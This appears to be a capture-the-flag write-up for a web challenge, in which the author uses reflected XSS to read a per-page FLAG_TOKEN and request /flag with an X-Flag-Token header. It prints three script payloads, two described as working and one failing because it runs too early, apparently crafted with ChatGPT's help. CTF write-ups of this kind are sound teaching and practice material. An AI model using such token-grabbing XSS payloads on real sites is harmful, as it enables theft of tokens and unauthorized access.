# 🟢 this must be the place

<figure><img src="../../../../.gitbook/assets/image (129).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../../.gitbook/assets/image (130).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../../.gitbook/assets/image (131).png" alt=""><figcaption></figcaption></figure>

'per-page token'

<figure><img src="../../../../.gitbook/assets/image (132).png" alt=""><figcaption></figcaption></figure>

reflected xss

at the start it said /flag can be fetched via a same origin so that rules out cross origin

<figure><img src="../../../../.gitbook/assets/image (133).png" alt=""><figcaption></figcaption></figure>

just to see what happens

so what i guess is FLAG\_TOKEN is in response body and it's a per-page token which likely means we can't use in /flag\
and when i asked chatGPT where i put the token it said in cookie and gave me X-Flag-token header

<figure><img src="../../../../.gitbook/assets/image (134).png" alt=""><figcaption></figcaption></figure>

undefined because injected payload ran first before that flag token

<figure><img src="../../../../.gitbook/assets/image (135).png" alt=""><figcaption></figcaption></figure>

got it my chatGPT modified xss

```
<script>Object.defineProperty(window, 'FLAG_TOKEN', {set: (value) => fetch('/flag', { headers: { 'X-Flag-Token': value } }).then(r => r.text()).then(t => alert(t))});</script>
```

```
<script>document.addEventListener('DOMContentLoaded', () => fetch('/flag', { headers: { 'X-Flag-Token': window.FLAG_TOKEN } }).then(r => r.text()).then(t => alert(t)));</script>
```

my initial payload didn't work because it got executed before `window.FLAG_TOKEN`  so i want a payload that grab's Token as soon as it executed

both of the above payload works

```
<script>fetch('/flag', {headers:{'X-Flag-Token':window.FLAG_TOKEN}}).then(r=>r.text()).then(alert)</script>
```

this payload won't work because of execution order.
